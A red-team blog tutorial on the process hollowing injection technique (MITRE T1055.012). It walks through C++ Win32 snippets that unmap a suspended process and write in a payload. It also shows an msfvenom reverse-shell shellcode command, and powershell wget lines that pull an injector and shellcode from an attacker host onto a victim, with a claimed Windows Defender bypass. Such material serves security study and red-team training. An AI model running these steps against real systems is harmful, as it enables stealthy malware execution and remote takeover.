@@ -1,0 +1,249 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/defense-evasion/" rel="category tag">Defense Evasion</a>, <a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
+            <h1 class="post-title entry-title">Process Hollowing (Mitre:T1055.012)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/process-hollowing-mitret1055-012/" rel="bookmark"><time class="entry-date published" datetime="2022-04-12T18:05:05+00:00">April 12, 2022</time><time class="updated" datetime="2025-06-23T18:47:24+00:00">June 23, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">In July 2011, John Leitch of autosectools.com talked about a technique he called process hollowing in his whitepaper <span style="color: #3366ff;"><a style="color: #3366ff;" href="https://attack.mitre.org/techniques/T1055/012/">here</a></span>. Ever since then, many malware campaigns like Bandook and Ransom.Cryak, and various APTs have utilized Process Hollowing for defense evasion and privilege escalation. In this article, we aim to discuss the technical concepts utilized behind the technique in an easy to comprehend manner and demonstrate a ready to go tool that can perform Process Hollowing in a portable manner.</span></p>
+<ol>
+<li><span style="color: #000000;"><strong>MITRE TACTIC: Defense Evasion (TA0005) and Privilege Escalation (TA0004)</strong></span></li>
+<li><span style="color: #000000;"><strong>MITRE Technique ID: Process Injection (T1055)</strong></span></li>
+<li><span style="color: #000000;"><strong>MITRE SUB ID: Process Hollowing (T1055.012)</strong></span></li>
+</ol>
+<h3><span style="color: #800000;">Table of content</span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Pre-Requisites</strong></span></li>
+<li><span style="color: #000000;"><strong>Process Hollowing</strong></span></li>
+<li><span style="color: #000000;"><strong>Demonstration 1: PoC</strong></span></li>
+<li><span style="color: #000000;"><strong>Demonstration 2: PoC</strong></span></li>
+<li><span style="color: #000000;"><strong>Demonstration 3: Real Time Exploit</strong></span></li>
+<li><span style="color: #000000;"><strong>Conclusion</strong></span></li>
+</ul>
+<h3><span style="color: #800000;">Pre-Requisites</span></h3>
+<p><span style="color: #000000;">One must be aware of the following requirements in order to fully understand the process discussed:</span></p>
+<ul>
+<li><span style="color: #000000;">C/C++/C# with Win32 API coding</span></li>
+<li><span style="color: #000000;">Registers, PEB, Memory management in Windows OS</span></li>
+<li><span style="color: #000000;">Debugging code</span></li>
+</ul>
+<h3><span style="color: #800000;">Process Hollowing</span></h3>
+<p><span style="color: #000000;">Firstly, the <strong data-start="211" data-end="234">fundamental concept</strong> is quite straightforward. In the <strong data-start="268" data-end="314">process hollowing code injection technique</strong>, an attacker creates a new process in a suspended state, unmaps (hollows) its image from memory, writes a <strong data-start="421" data-end="441">malicious binary</strong>, and finally resumes the program state to execute the injected code. The <strong data-start="515" data-end="527">workflow</strong> of the technique is:</span></p>
+<h5><span style="color: #000000;"><strong>STEPS</strong></span></h5>
+<p><span style="color: #000000;">1: Creating a new process in a suspended state:</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>CreateProcessA() </strong>with <strong>CREATE_SUSPENDED </strong>flag set</span></li>
+</ul>
+<p><span style="color: #000000;">2: Swap out its memory contents (unmapping/hollowing):</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>NtUnmapViewOfSection()</strong></span></li>
+</ul>
+<p><span style="color: #000000;">3: Input malicious payload in this unmapped region:</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>VirtualAllocEx : </strong>To allocate new memory</span></li>
+<li><span style="color: #000000;"><strong>WriteProcessMemory() </strong>: To write each of malware sections to target the process space</span></li>
+</ul>
+<p><span style="color: #000000;">4: Setting EAX to the entrypoint:</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>SetThreadContext()</strong></span></li>
+</ul>
+<p><span style="color: #000000;">5: Start the suspended thread:</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>ResumeThread()</strong></span></li>
+</ul>
+<p><span style="color: #000000;">Programmatically speaking, in the original code, the following code was used to demonstrate the same which is explained below</span></p>
+<h4><span style="color: #000000;">Step 1: Creating a new process</span></h4>
+<p><span style="color: #000000;">An adversary first creates a new process. To create a benign process in suspended mode the functions are used:</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>CreateProcessA() and flag CREATE_SUSPENDED</strong></span></li>
+</ul>
+<p><span style="color: #000000;">Following code, snippet is taken from the original source <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://attack.mitre.org/techniques/T1055/012/">here</a></strong></span>. An explanation is as follows:</span></p>
+<ul>
+<li><span style="color: #000000;">pStartupInfo is the pointer to the STARTUPINFO structure which specifies the appearance of the window at creation time</span></li>
+<li><span style="color: #000000;">pProcessInfo is the pointer to the PROCESS_INFORMATION structure that contains details about a process and its main thread. It returns a handle called hProcess which can be used to modify the memory space of the process created.</span></li>
+<li><span style="color: #000000;">These two pointers are required by CreateProcessA function to create a new process.</span></li>
+<li><span style="color: #000000;">CreateProcessA creates a new process and its primary thread and inputs various different flags. One such flag being the CREATE_SUSPENDED. This creates a process in a suspended state. For more details on this structure, refer <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa">here</a></strong></span>.</span></li>
+<li><span style="color: #000000;">If the process creation fails, function returns 0.</span></li>
+<li><span style="color: #000000;">Finally, if the pProcessInfo pointer doesn’t return a handle, means the process hasn’t been created and the code ends.</span></li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">printf("Creating process\r\n");
+LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
+LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
+CreateProcessA
+(
+                0,
+                pDestCmdLine,
+                0,
+                0,
+                0,
+                CREATE_SUSPENDED,
+                0,
+                0,
+                pStartupInfo,
+                pProcessInfo
+);
+ 
+if (!pProcessInfo-&gt;hProcess)
+{
+                printf("Error creating process\r\n");
+                return;
+}</pre>
+<h4><span style="color: #000000;">Step 2: Information Gathering</span></h4>
+<ul>
+<li><span style="color: #000000;"><strong>Read the base address of the created process</strong></span></li>
+</ul>
+<p><span style="color: #000000;">We have to know the base address of the created process so that we can use this to copy this memory block to the created process’ memory block later. This can be done using:</span></p>
+<p><span style="color: #000000;"><strong>NtQueryProcessInformation + ReadProcessMemory</strong></span></p>
+<p><span style="color: #000000;">Also, can be done easily using a single function:</span></p>
+<p><span style="color: #000000;"><strong>ReadRemotePEB(pProcessInfo-&gt;hProcess) PPEB pPEB = ReadRemotePEB(pProcessInfo-&gt;hProcess);</strong></span></p>
+<ul>
+<li><span style="color: #000000;"><strong>Read the NT Headers format (from the PE structure) from the PEB’s image address.</strong></span></li>
+</ul>
+<p><span style="color: #000000;"><strong data-start="184" data-end="198">To proceed</strong>, this step is <strong data-start="213" data-end="226">essential</strong> as it contains <strong data-start="242" data-end="275">information related to the OS</strong>, which we need in the upcoming code. We can accomplish this using the ReadRemoteImage() function. The variable pImage serves as a pointer to the <strong data-start="433" data-end="452">hProcess handle</strong> and the <strong data-start="461" data-end="481">ImageBaseAddress</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">PLOADED_IMAGE pImage = ReadRemoteImage
+(
+pProcessInfo-&gt;hProcess,
+pPEB-&gt;ImageBaseAddress
+);</pre>
+<h4><span style="color: #000000;">Step 3: Unmapping (hollowing) and swapping the memory contents</span></h4>
+<p><span style="color: #000000;"><strong>Unmapping</strong></span></p>
+<p><span style="color: #000000;">After obtaining the NT headers, we can unmap the image from memory.</span></p>
+<ul>
+<li><span style="color: #000000;">Get a handle of NTDLL, a file containing Windows Kernel Functions</span></li>
+<li><span style="color: #000000;">HMODULE obtains a handle hNTDLL that points to NTDLL’s base address using GetModuleHandleA()</span></li>
+<li><span style="color: #000000;">GetProcAddress() takes input of NTDLL</span></li>
+<li><span style="color: #000000;">handle to ntdll that contains the “NtUnmapViewOfSection” variable name stored in the specified DLL</span></li>
+<li><span style="color: #000000;">Create NtUnmapViewOfSection variable which carves out process from the memory</span></li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">printf("Unmapping destination section\r\n");
+HMODULE hNTDLL = GetModuleHandleA("ntdll");                                                                                                                                  
+
+FARPROC fpNtUnmapViewOfSection = GetProcAddress  
+(
+            hNTDLL,                                                                                             
+            "NtUnmapViewOfSection"                                      
+);
+ 
+_NtUnmapViewOfSection NtUnmapViewOfSection =
+(_NtUnmapViewOfSection)fpNtUnmapViewOfSection;   
+ 
+DWORD dwResult = NtUnmapViewOfSection
+(
+            pProcessInfo-&gt;hProcess,
+            pPEB-&gt;ImageBaseAddress
+);</pre>
+<p><span style="color: #000000;"><strong>Swapping memory contents</strong></span></p>
+<p><span style="color: #000000;">Now we have to map a new block of memory for source image. Here, a malware would be copied to a new block of memory. For this we need to provide:</span></p>
+<ul>
+<li><span style="color: #000000;">A handle to process,</span></li>
+<li><span style="color: #000000;">Base address,</span></li>
+<li><span style="color: #000000;">Size of the image,</span></li>
+<li><span style="color: #000000;">Allocation type-&gt; here, MEM_COMMIT | MEM_RESERVE means we demanded and reserved a particular contiguous block of memory pages</span></li>
+<li><span style="color: #000000;">Memory protection constant. Read <a style="color: #000000;" href="https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants">here</a>. PAGE_EXECUTE_READWRITE -&gt; enables RWX on the committed memory block.</span></li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">PVOID pRemoteImage = VirtualAllocEx
+(
+            pProcessInfo-&gt;hProcess,
+            pPEB-&gt;ImageBaseAddress,
+            pSourceHeaders-&gt;OptionalHeader.SizeOfImage,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE
+);</pre>
+<h4><span style="color: #000000;">Step 4: Copy this new block of memory (malware) to the suspended process memory</span></h4>
+<p><span style="color: #000000;">Then, section by section, we copy our new block of memory (<strong data-start="618" data-end="641">pSectionDestination</strong>) to the <strong data-start="650" data-end="669">virtual address</strong> of the process memory (<strong data-start="693" data-end="709">pSourceImage</strong>).</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">for (DWORD x = 0; x &lt; pSourceImage-&gt;NumberOfSections; x++)
+{
+            if (!pSourceImage-&gt;Sections[x].PointerToRawData)
+                        continue;
+            PVOID pSectionDestination =          (PVOID)((DWORD)pPEB-&gt;ImageBaseAddress + pSourceImage-&gt;Sections[x].VirtualAddress);
+}</pre>
+<h4><span style="color: #000000;">Step 5: Rebasing the source image</span></h4>
+<p><span style="color: #000000;">Since the source image loads to a different <strong data-start="766" data-end="786">ImageBaseAddress</strong> than the destination process, we need to rebase it so that the binary can properly resolve the addresses of <strong data-start="895" data-end="915">static variables</strong> and other <strong data-start="926" data-end="948">absolute addresses</strong>. The <strong data-start="954" data-end="972">Windows loader</strong> determines how to patch images in memory by referring to a <strong data-start="1032" data-end="1052">relocation table</strong> that resides in the binary.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">for (DWORD y = 0; y &lt; dwEntryCount; y++)
+{
+            dwOffset += sizeof(BASE_RELOCATION_ENTRY);
+            if (pBlocks[y].Type == 0)
+                        continue;
+            DWORD dwFieldAddress = pBlockheader-&gt;PageAddress + pBlocks[y].Offset;
+            DWORD dwBuffer = 0;
+            ReadProcessMemory
+            (
+                        pProcessInfo-&gt;hProcess,
+                        (PVOID)((DWORD)pPEB-&gt;ImageBaseAddress + dwFieldAddress),
+                        &amp;dwBuffer,
+                        sizeof(DWORD),
+                        0
+            );
+            dwBuffer += dwDelta;
+            BOOL bSuccess = WriteProcessMemory
+            (
+                        pProcessInfo-&gt;hProcess,
+                        (PVOID)((DWORD)pPEB-&gt;ImageBaseAddress + dwFieldAddress),
+                        &amp;dwBuffer,
+                        sizeof(DWORD),
+                        0
+            );
+}</pre>
+<h4><span style="color: #000000;">Step 6: Setting EAX to the entrypoint and Resuming Thread</span></h4>
+<p><span style="color: #000000;">Then, we’ll get the thread context, set EAX to entrypoint using SetThreadContext and resume execution using ResumeThread()</span></p>
+<ul>
+<li><span style="color: #000000;">EAX is a special purpose register which stores the return value of a function. Code execution begins where EAX points.</span></li>
+<li><span style="color: #000000;">The thread context includes all the information the thread needs to seamlessly resume execution, including the thread’s set of CPU registers and stack.</span></li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">LPCONTEXT pContext = new CONTEXT();
+pContext-&gt;ContextFlags = CONTEXT_INTEGER;
+GetThreadContext(pProcessInfo-&gt;hThread, pContext)
+DWORD dwEntrypoint = (DWORD)pPEB-&gt;ImageBaseAddress + pSourceHeaders-&gt;OptionalHeader.AddressOfEntryPoint;
+pContext-&gt;Eax = dwEntrypoint;                               //EAX set to the entrypoint
+SetThreadContext(pProcessInfo-&gt;hThread, pContext)
+ResumeThread(pProcessInfo-&gt;hThread)                 //Thread resumed</pre>
+<h4><span style="color: #000000;">Step 7: Replacing genuine process with custom code</span></h4>
+<p><span style="color: #000000;">Afterward, we pass our <strong data-start="1114" data-end="1129">custom code</strong> that should replace a genuine process. In the code shared by <strong data-start="1191" data-end="1206">John Leitch</strong>, a function called <strong data-start="1226" data-end="1251">CreateHallowedProcess</strong> encapsulates all the logic from steps 1 through 6. It takes as arguments the name of the <strong data-start="1341" data-end="1360">genuine process</strong> (e.g., svchost) and the path to the <strong data-start="1399" data-end="1417">custom payload</strong> (e.g., HelloWorld.exe).</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">pPath[strrchr(pPath, '\\') - pPath + 1] = 0;
+strcat(pPath, "helloworld.exe");
+CreateHollowedProcess("svchost",pPath);</pre>
+<h3><span style="color: #800000;">Demonstration 1</span></h3>
+<p><span style="color: #000000;">Furthermore, you can download, inspect, and run the <strong data-start="1506" data-end="1523">official code</strong> using Process Hollowing. <a href="https://code.google.com/archive/p/process-hollowing/downloads">Download</a> the full code, extract it, and run <strong data-start="1593" data-end="1617">ProcessHollowing.exe</strong>, which contains the entire implementation. As you’ll observe, the file creates a new process and injects <strong data-start="1723" data-end="1741">HelloWorld.exe</strong> into it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh-3pJUBebePttznpc1ds05fUsJyMx7TlpYmicm2_OUfzUQt-UpukVQUcZ92kKirfmz8T0NP31odMGOZSr2a5zcKoNzlb5jXQyb7BnARKTfgiMRgGER4sM3hoj7E2P4zu0wYN4JSw-8Og2o7uy51bcrctrU40SbISu8KknMazDK50wGNwGnm8lD3R30vw/s16000/1.png"/></span></p>
+<p><span style="color: #000000;"><strong data-start="1757" data-end="1776">Upon inspection</strong> in <strong data-start="1780" data-end="1800">Process Explorer</strong>, we observe a new process spawns as svchost, but there’s no mention of <strong data-start="1874" data-end="1892">HelloWorld.exe</strong>, which indicates that the EXE has been <strong data-start="1932" data-end="1947">masqueraded</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8TTWgHonyf_SI27ZlP9EF99A1Xrq223ST1vTRXHrv-5ltSfqX-eA4Ko9aj--Z6q0qGdgI_0aVp9F4cJc4ZC13MLHdWpipcKYTfcbOPNg-TUei_Cvd8AlJcRBPgXdS0FR6EgwLc4F4NnMFseZ1nxwEkUNTvgv5HUM_9RyaYzHlHF_wMvnW53L3y1Ed0A/s16000/2.png"/></span></p>
+<p><span style="color: #000000;"><strong data-start="1955" data-end="1964">NOTE:</strong> You can manually modify this code and inject your own shell (generated via tools like <strong data-start="2051" data-end="2063">msfvenom</strong>) using <strong data-start="2071" data-end="2088">Visual Studio</strong> and by rebuilding the <strong data-start="2111" data-end="2126">source code</strong>, though that goes beyond the scope of this article.</span></p>
+<h3><span style="color: #800000;">Demonstration 2</span></h3>
+<p><span style="color: #000000;">Ryan Reeves created a PoC of the technique which can be found . Interestingly, <strong data-start="2204" data-end="2219">Ryan Reeves</strong> created a <strong data-start="2230" data-end="2237">PoC</strong> for this technique, which you can find <strong><a href="https://github.com/reevesrs24/EvasiveProcessHollowing">online</a></strong>. In part 1, he coded a <strong data-start="2307" data-end="2332">Process Hollowing EXE</strong> that injects a small <strong data-start="2354" data-end="2367">PoC popup</strong> into a legitimate explorer.exe process. Notably, this standalone EXE can have its popup replaced with msfvenom shellcode to yield a reverse shell to your own C2 server. As a result, you can run it as shown, and you’ll receive a small popup:<br/>
+</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhjw7Wg24ePEkveTYcQlt1Gb8UM87PoHLQprE7yPWwd6FQizt9BMHXMl-Oxe4FPolwy0FAOSngOkv8aIUDSgokHvfD-9mtQh3Jj4AqL1ItPWRMojfq2DE_rpAZzBo-mfUPX8PFVPZySlLK5VMUEJWe5f6cpiE4GWynT9038NFUffous5KOje5gJbT-k-Q/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">Then, by checking in <strong data-start="2639" data-end="2659">Process Explorer</strong>, we confirm that a new explorer.exe process was created with the specified <strong data-start="2737" data-end="2751">process ID</strong>, which indicates that our EXE has been successfully <strong data-start="2804" data-end="2819">masqueraded</strong> using the <strong data-start="2830" data-end="2853">hollowing technique</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjcY4GIQvCDH2pV5Uy7wkUwLixEnLYm4D7sMi660FK8DQDnZYEeNj9m6EgJKrpfAid4KEThASGKvtxI5XzkEiIR-MPtk3DDPPaUK8GQD-Ue1jXlvY7GdcmljgVJZOiwptK8_UPmxWYMLysjI-xmfrr5RmXNxguiPw13T375Bb_pajdfnh5GVYV4YUbscw/s16000/4.png"/></span></p>
+<h3><span style="color: #800000;">Demonstration 3: Real-Time Exploit</span></h3>
+<p><span style="color: #000000;">We saw two PoCs above but the fact is both of these methods aren’t beginner-friendly and need coding knowledge to execute the attack in real-time environment. Lucky for us, in comes ProcessInjection.exe tool created by <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/3xpl01tc0d3r/ProcessInjection">Chirag Savla</a></strong></span> which takes a raw shellcode as input from a text file and injects into a legit process as specified by the user. To begin, you can <strong data-start="217" data-end="241">download and compile</strong> the project using <strong data-start="260" data-end="277">Visual Studio</strong> for release. (Go to Visual Studio → open .sln file → build for release)<br/>
+</span></p>
+<p><span style="color: #000000;">Next, we need to create our <strong data-start="390" data-end="403">shellcode</strong>. In this example, I’m generating a <strong data-start="439" data-end="464">hexadecimal shellcode</strong> for reverse_tcp using <strong data-start="489" data-end="496">CMD</strong>:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/x64/shell_reverse_tcp exitfunc=thread LHOST=192.168.0.89 LPORT=1234 -f hex</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhR3XHToOlG9MY9WGHTW2sAe0DS0qDReFn7UqzD26gbWD5FeIZmTetUhNwS3f7tyZUVxYFRG5c83Hv8dGYhqKMVUpe5D_5YhSSQWBh7oQODkCPbVKdp2eNXlXmq1pRvRZ4bILrRM4kcCc8IqshQ-fsbZuctEp41j5z9JNwXMrkVKmdQiU7InNlfv9j1Eg/s16000/5.png"/></span></p>
+<p data-start="608" data-end="835"><span style="color: #000000;">After generating the shellcode, we transfer it along with our <strong data-start="674" data-end="698">ProcessInjection.exe</strong> file to the <strong data-start="711" data-end="728">victim system</strong>. Then, we execute the shellcode using the <strong data-start="771" data-end="802">Process Hollowing technique</strong>. Here’s how the parameters work:</span></p>
+<ul>
+<li><span style="color: #000000;">/t:3 specifies Process Hollowing</span></li>
+<li><span style="color: #000000;">/f indicates the shellcode format (hexadecimal in this case)</span></li>
+<li><span style="color: #000000;">/path: points to the shellcode file (here, hex.txt)</span></li>
+<li><span style="color: #000000;">/ppath: provides the full path to the legitimate process to spawn</span></li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell wget 192.168.0.89/ProcessInjection.exe -O ProcessInjection.exe
+powershell wget 192.168.0.89/hex.txt -O hex.txt
+ProcessInjection.exe /t:3 /f:hex /path:"hex.txt" /ppath:"c:\windows\system32\notepad.exe"</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikoBZ5P6Hq8vbZtoiVdgLgKu0N5RkGUjPeJY11dtsO70nNaijubqO_Ip3BvjyoZepLoUesvRlC589JXD_DwNv3FxzN0Afh2QRYcUOzcToAfDO3ROvEKSGyRPssvwfSiuYFxC8mIy-NhfZtan_ouwM7AYrz4kVzvPolf62_1utpR8wXDJBg1sAim_r4Jw/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">As a result, notepad.exe spawns with our own <strong data-start="1361" data-end="1374">shellcode</strong> injected, and we successfully receive a <strong data-start="1415" data-end="1432">reverse shell</strong>!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiX9-TyAMMLvOhOEjvRiP_cSaqBW9PoiaBPZDVTUsTxfwJ0xgSpMI3puZQMo_nzskKhJzd4vXyNHDBcnphCsv9RZUhTSd7TmZNCyrsmfkiYuxZNCzuRQQTcOtW6PVNpsw4F3OEOxuKK1DDuTZh8CYttpJYm14qxlkTAZm7MNr5OT9XyH3S9OsLiurnM2w/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">Out of curiosity, we tested this locally with <strong data-start="1490" data-end="1513">Windows Defender ON</strong>. As shown, the <strong data-start="1529" data-end="1550">Process Hollowing</strong> completed without issues.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhSZfxbOMqBdGYDt778dDHzM2t13g4F_gwAMozh4DL1G4AqGmkdCeLNV45r5H7Fm3FLuz-77WntIC5IczuR8WGaZkUwepf3q1rmqlRCIWiK8immEYRT7-r-9hPCtSn2raWRbiHpv1tbgaqIxi9Rn1RwuwPRVQYJCJjNN2nLTy-9hA5M61_exc8qmCr1Hw/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">In Process Explorer, we observe that a new notepad.exe process has been spawned with the same PID as the one created by our executable.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhGbCaeSDG8lTQRbv5suNrQUb-S4ll3kntL_essUQZ2eB1y9ELTaJQ3HqcSxB9E3G3Vl_Mak13pCx2iaIW6QC6YKNX3-HrFry_vgvDXM0SybZifoUDeyawrDvS7SfZfnG6d32HSfYQ3yoTyr4EHVowEW9gxxSq8mpkQdgY6tT-B3F_mrj8whR2-Q1z45g/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">Finally, when we executed this, <strong data-start="1771" data-end="1783">Defender</strong> didn’t detect any threats, confirming that we had successfully <strong data-start="1847" data-end="1873">bypassed the antivirus</strong>.</span></p>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjh_Zys_Fc_wAA9slg2GtfSjL4jSkXnWArhXIV37D0WMZf9UfZc4U9ehxI6qmqOBcoEEuXyCDn6kGN2-oMmoQikhJqxebbDH8kjEGgO_WvKFSxY845PtYbtQ2ZfAS6_Ed2EYHSQOy5lbbg2idXroH73o-v3yQx1DZ4t_JlNZvVbWCCHt4Q_BrRhr5Pa5g/s16000/10.png"/></strong></span></p>
+<p><span style="color: #000000;"><strong data-start="1881" data-end="1890">NOTE:</strong> Newer versions of <strong data-start="1909" data-end="1920">Windows</strong> might detect this behavior, as updated patches monitor <strong data-start="1976" data-end="2004">unmapped memory segments</strong>, thereby preventing traditional <strong data-start="2037" data-end="2069">process hollowing techniques</strong>.</span></p>
+<h3><span style="color: #800000;">Conclusion</span></h3>
+<p><span style="color: #000000;">The article discussed a process injection method known as Process Hollowing in which an attacker is able to achieve code execution by creating a benign new process in a suspended state, injecting custom malicious code in it and then resuming its execution again. Additionally, the article explored some of the original code described by John Leitch. It also provided a basic breakdown of the technique, followed by three PoC examples available on GitHub. We hope you enjoyed the article. Thanks again for reading.</span></p>
+<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact</span><strong> <span style="color: #0000ff;"><a class="broken_link" style="color: #0000ff;" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></span></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
